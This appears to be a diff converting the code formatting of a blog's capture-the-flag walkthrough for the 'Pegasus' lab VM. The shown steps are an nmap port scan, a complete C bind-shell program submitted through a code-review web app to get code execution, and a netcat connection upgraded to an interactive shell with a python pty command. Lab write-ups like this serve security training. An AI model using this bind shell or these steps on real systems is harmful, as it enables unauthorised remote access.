@@ -142,23 +142,37 @@
 
 <p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:~# nmap -sS -p- -T5 172.16.231.132</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sS -p- -T5 172.16.231.132
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:31 GMT
+</span><span class='line'>Nmap scan report for 172.16.231.132
+</span><span class='line'>Host is up (0.000063s latency).
+</span><span class='line'>Not shown: 65526 closed ports
+</span><span class='line'>PORT      STATE SERVICE
+</span><span class='line'>22/tcp    open  ssh
+</span><span class='line'>111/tcp   open  rpcbind
+</span><span class='line'>8088/tcp  open  radan-http
+</span><span class='line'>
+</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 (VMware)
+</span><span class='line'>
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
+</span><span class='line'>root@kali:~#</span></code></pre></td></tr></table></div></figure>
 
-<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-19 13:31 GMT
-Nmap scan report for 172.16.231.132
-Host is up (0.000063s latency).
-Not shown: 65526 closed ports
-PORT      STATE SERVICE
-22/tcp    open  ssh
-111/tcp   open  rpcbind
-8088/tcp  open  radan-http</p>
-
-<p>MAC Address: 00:0C:29:E3:2A:04 (VMware)</p>
-
-<p>Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
-root@kali:~#
-[/plain]</p>
 
 <p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>
 
@@ -180,73 +194,120 @@ root@kali:~#
 
 <p>Mike is a code reviewer, and a trainee&hellip; therefore is pretty inexperienced. After a bit of time throwing various languages at the application, I found out that if you provide C sourcecode, it gets compiled and executed. Nice ! Lets bash some shellcode in there - specifically a bind shell and submit it.</p>
 
-<p>[c]#include &lt;sys/socket.h></p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">dstport</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>
+</span><span class='line'>        <span class="kt">int</span> <span class="n">o</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">mysockaddr</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>        <span class="c1">//setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;o, sizeof(o)); //a luxury we don&#39;t have space for</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span> <span class="c1">//2</span>
+</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dstport</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span> <span class="c1">//0</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">mysockaddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mysockaddr</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>include &lt;sys/types.h></h1>
-
-<h1>include &lt;stdlib.h></h1>
-
-<h1>include &lt;unistd.h></h1>
-
-<h1>include &lt;netinet/in.h></h1>
-
-<p>int main(void)
-{
-        int clientfd, sockfd;
-        int dstport = 4444;
-        int o = 1;
-        struct sockaddr_in mysockaddr;</p>
-
-<pre><code>    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    //setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;o, sizeof(o)); //a luxury we don't have space for
-
-    mysockaddr.sin_family = AF_INET; //2
-    mysockaddr.sin_port = htons(dstport);
-    mysockaddr.sin_addr.s_addr = INADDR_ANY; //0
-
-    bind(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(mysockaddr));
-
-    listen(sockfd, 0);
-
-    clientfd = accept(sockfd, NULL, NULL);
-
-    dup2(clientfd, 0);
-    dup2(clientfd, 1);
-    dup2(clientfd, 2);
-
-    execve("/bin/sh", NULL, NULL);
-    return 0;
-</code></pre>
-
-<p>}[/c]</p>
 
 <p>A quick NMAP scan confirms port 4444 has been opened.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:~# nmap -sS -p4444 -T5 172.16.231.132</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">p4444</span> <span class="o">-</span><span class="n">T5</span> <span class="mf">172.16.231.132</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">6.47</span> <span class="p">(</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//nmap.org ) at 2014-12-19 13:47 GMT</span>
+</span><span class='line'><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">172.16.231.132</span>
+</span><span class='line'><span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.00040</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+</span><span class='line'><span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
+</span><span class='line'><span class="mi">4444</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">krb524</span>
+</span><span class='line'><span class="n">MAC</span> <span class="nl">Address</span><span class="p">:</span> <span class="mo">00</span><span class="o">:</span><span class="mi">0</span><span class="nl">C</span><span class="p">:</span><span class="mi">29</span><span class="o">:</span><span class="nl">E3</span><span class="p">:</span><span class="mi">2</span><span class="nl">A</span><span class="p">:</span><span class="mo">04</span> <span class="p">(</span><span class="n">VMware</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Nmap</span> <span class="nl">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mf">13.04</span> <span class="n">seconds</span>
+</span><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-19 13:47 GMT
-Nmap scan report for 172.16.231.132
-Host is up (0.00040s latency).
-PORT     STATE SERVICE
-4444/tcp open  krb524
-MAC Address: 00:0C:29:E3:2A:04 (VMware)</p>
-
-<p>Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
-root@kali:~#
-[/plain]</p>
 
 <p>A quick connection to the port via Netcat and a bit of Python allow us to get a TTY enabled shell.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:~# nc -nv 172.16.231.132 4444
-(UNKNOWN) [172.16.231.132] 4444 (?) open
-python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
-mike@pegasus:/home/mike$ id
-id
-uid=1001(mike) gid=1001(mike) groups=1001(mike)
-mike@pegasus:/home/mike$
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="mf">172.16.231.132</span> <span class="mi">4444</span>
+</span><span class='line'><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">172.16.231.132</span><span class="p">]</span> <span class="mi">4444</span> <span class="p">(</span><span class="o">?</span><span class="p">)</span> <span class="n">open</span>
+</span><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">import</span> <span class="n">pty</span><span class="p">;</span><span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">)</span><span class="err">&#39;</span>
+</span><span class='line'><span class="n">mike</span><span class="err">@</span><span class="nl">pegasus</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">mike</span><span class="err">$</span> <span class="n">id</span>
+</span><span class='line'><span class="n">id</span>
+</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span>
+</span><span class='line'><span class="n">mike</span><span class="err">@</span><span class="nl">pegasus</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">mike</span><span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Now over to barrebas for the next step ! <em>fancy screen wipe animation</em></p>
 
